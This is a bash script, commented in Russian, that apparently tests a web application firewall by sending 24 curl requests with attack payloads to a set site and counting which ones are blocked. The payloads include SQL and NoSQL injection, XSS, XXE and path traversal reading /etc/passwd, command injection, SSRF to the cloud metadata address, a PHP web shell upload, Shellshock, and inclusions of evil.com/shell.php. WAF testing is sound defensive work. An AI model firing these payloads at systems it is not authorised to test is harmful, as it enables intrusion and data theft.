#!/bin/bash
# WAF тесты с использованием curl для Linux (bash)

# Конфигурация - укажите здесь целевой сайт
BASE_URL="https://msproject.site.net/console"

# Инициализация переменных для статистики
TOTAL_TESTS=24
BLOCKED=0
ALLOWED=0
ERRORS=0
RESULTS=()

# Функция для выполнения теста и сбора результатов
run_test() {
    local test_name="$1"
    local test_cmd="$2"
    
    echo -e "\n=== Тест $(($TOTAL_TESTS_RUN+1)): $test_name ==="
    echo "Выполняется: $test_cmd"
    
    # Выполнение команды и сохранение статуса
    result=$(eval "$test_cmd" 2>&1)
    status_code=$(echo "$result" | grep -oP 'HTTP/[\d.]+ \K\d+' | head -1)
    
    # Извлечение содержимого ответа
    response_body=$(echo "$result" | awk -v RS='\r\n\r\n' 'END{print}')
    
    if [ "$status_code" == "403" ]; then
        echo "✅ Статус: ЗАБЛОКИРОВАНО (HTTP $status_code)"
        BLOCKED=$((BLOCKED+1))
        RESULTS+=("✅ $test_name: ЗАБЛОКИРОВАНО (HTTP $status_code)")
        
        # Извлечение Transaction ID если есть
        tx_id=$(echo "$result" | grep -oP 'Transaction-ID: \K[a-f0-9-]+' | head -1)
        if [ ! -z "$tx_id" ]; then
            echo "🔑 Transaction ID: $tx_id"
            RESULTS+=("   🔑 Transaction ID: $tx_id")
        fi
        
        # Вывод содержимого ответа
        echo -e "\nОтвет сервера:"
        echo "Forbidden"
        if [ ! -z "$tx_id" ]; then
            echo "Transaction ID: $tx_id"
        fi
    elif [ "$status_code" == "" ]; then
        echo "❌ Ошибка: Не удалось определить статус ответа"
        ERRORS=$((ERRORS+1))
        RESULTS+=("❌ $test_name: ОШИБКА")
        
        # Вывод содержимого ответа для отладки
        echo -e "\nСодержимое ответа:"
        echo "$response_body"
    else
        echo "⚠️ Статус: РАЗРЕШЕНО (HTTP $status_code)"
        ALLOWED=$((ALLOWED+1))
        RESULTS+=("⚠️ $test_name: РАЗРЕШЕНО (HTTP $status_code)")
        
        # Вывод содержимого ответа
        echo -e "\nСодержимое ответа:"
        echo "$response_body"
    fi
    
    TOTAL_TESTS_RUN=$((TOTAL_TESTS_RUN+1))
    echo ""
    sleep 1
}

# Начало выполнения тестов
echo "🚀 Начинаем тестирование атак на WAF..."
echo "📋 Всего запланировано тестов: $TOTAL_TESTS"
echo "🎯 Целевой сайт: $BASE_URL"
TOTAL_TESTS_RUN=0

# Тест 1: SQL Injection
run_test "SQL Injection" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/search?q=1'"'"'+OR+'"'"'1'"'"'%3D'"'"'1"'

# Тест 2: Cross-Site Scripting (HTML)
run_test "Cross-Site Scripting (HTML)" 'curl -s -v -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d "q=<script>alert(1)</script>" "'"$BASE_URL"'/search"'

# Тест 3: Cross-Site Scripting (URL)
run_test "Cross-Site Scripting (URL)" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/redirect?url=javascript:alert(1)"'

# Тест 4: XML External Entities (XXE)
run_test "XML External Entities (XXE)" 'curl -s -v -X POST -H "Content-Type: application/xml" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d '"'"'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'"'"' "'"$BASE_URL"'/api/xml"'

# Тест 5: Path Traversal
run_test "Path Traversal" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/files?file=../../../etc/passwd"'

# Тест 6: NoSQL Injection
run_test "NoSQL Injection" 'curl -s -v -X POST -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d '"'"'{"search": {"$where": "function() { return true; }"}, "limit": 1}'"'"' "'"$BASE_URL"'/search"'

# Тест 7: OS Command Injection
run_test "OS Command Injection" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/status?cmd=ping;cat%20/etc/passwd"'

# Тест 8: Server-Side Request Forgery (SSRF)
run_test "Server-Side Request Forgery (SSRF)" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/proxy?url=http://169.254.169.254/latest/meta-data/"'

# Тест 9: Local File Inclusion (LFI)
run_test "Local File Inclusion (LFI)" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/include?file=../../../etc/passwd%00"'

# Тест 10: Server-Side Template Injection (SSTI)
run_test "Server-Side Template Injection (SSTI)" 'curl -s -v -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d "name={{7*7}}&email=test@example.com" "'"$BASE_URL"'/profile"'

# Тест 11: XPath Injection - исправленная версия
run_test "XPath Injection" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/users?xpath=/users/user%5Busername/text()=%27admin%27%20or%20%271%27=%271%27%5D"'

# Тест 12: XML Injection
run_test "XML Injection" 'curl -s -v -X POST -H "Content-Type: application/xml" -H "Accept: application/xml" -H "User-Agent: sqlmap/1.4.7" -d '"'"'<?xml version="1.0" encoding="UTF-8"?><user><id>1 OR 1=1</id><name>test'"'"' OR '"'"'1'"'"'='"'"'1</name></user>'"'"' "'"$BASE_URL"'/api/xml"'

# Тест 13: Open Redirect
run_test "Open Redirect" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/redirect?url=http://evil.com/shell.php"'

# Тест 14: Web Shell Upload
run_test "Web Shell Upload" 'curl -s -v -X POST -H "Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575" -H "User-Agent: Nessus/8.10.1" -H "X-Requested-With: XMLHttpRequest" --data-binary '"'"'-----------------------------974767299852498929531610575
Content-Disposition: form-data; name="file"; filename="shell.php.png"
Content-Type: image/png

GIF87a;
<?php
  system('\''id'\'');
?>
-----------------------------974767299852498929531610575--'"'"' "'"$BASE_URL"'/upload"'

# Тест 15: Cross-Site Request Forgery (CSRF) - исправленная версия
run_test "Cross-Site Request Forgery (CSRF)" 'curl -s -v -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -H "Origin: evil.com" -H "Referer: evil.com/fake.html" -H "X-CSRF-Token: fake-token" -d "username=<script>alert(document.cookie)</script>&password=password&action=login" "'"$BASE_URL"'/login"'

# Тест 16: Vulnerability Scanner
run_test "Vulnerability Scanner" 'curl -s -v -H "User-Agent: Nessus SOAP" "'"$BASE_URL"'/include?file=../../../../etc/passwd%00"'

# Тест 17: Automated Bot User Agent
run_test "Automated Bot User Agent" 'curl -s -v -X POST -H "Content-Type: application/json" -H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)" -d '"'"'{"search": {"$where": "function() { return true; }"}, "limit": 1}'"'"' "'"$BASE_URL"'/search"'

# Тест 18: Malformed HTTP Request
run_test "Malformed HTTP Request" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -H "X-Custom-IP-Authorization: 127.0.0.1" "'"$BASE_URL"'/files?file=../../../etc/passwd"'

# Тест 19: Response Splitting
run_test "Response Splitting" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/include?file=http://evil.com/shell.php"'

# Тест 20: JWT Attack (None Algorithm)
run_test "JWT Attack (None Algorithm)" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9." "'"$BASE_URL"'/api/admin?alg=none&debug=true"'

# Тест 21: Large Body Test (генерируем большой JSON payload)
BIG_PAYLOAD=$(printf '{"data": "%s"}' $(printf 'A%.0s' {1..50000}))
run_test "Large Body Test" 'curl -s -v -X POST -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d "$BIG_PAYLOAD" "'"$BASE_URL"'/api/data"'

# Тест 22: LFI with PHP Wrapper
run_test "LFI with PHP Wrapper" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/download?file=php://filter/convert.base64-encode/resource=/etc/passwd&type=lfi"'

# Тест 23: RCE via User-Agent
run_test "RCE via User-Agent" 'curl -s -v -H "User-Agent: () { :; }; /bin/bash -c \"cat /etc/passwd\"" "'"$BASE_URL"'/"'

# Тест 24: GraphQL Introspection
run_test "GraphQL Introspection" 'curl -s -v -X POST -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d '"'"'{"query": "query{__schema{types{name,fields{name}}}}"}'"'"' "'"$BASE_URL"'/graphql"'

# Отображение сводки результатов
echo ""
echo "📊 ====== ОТЧЕТ О ТЕСТИРОВАНИИ PTAF PRO ======"
echo ""
echo "🎯 Всего тестов: $TOTAL_TESTS"
echo "🛡️ Успешно заблокировано: $BLOCKED"
echo "⚠️ Разрешено (не заблокировано): $ALLOWED"
echo "❌ Ошибок: $ERRORS"
echo ""
echo "📝 Детальный отчет по тестам:"
echo ""

for result in "${RESULTS[@]}"; do
    echo "$result"
done

echo ""
echo "🎯 ======================================"

echo "✨ Все тесты выполнены!" 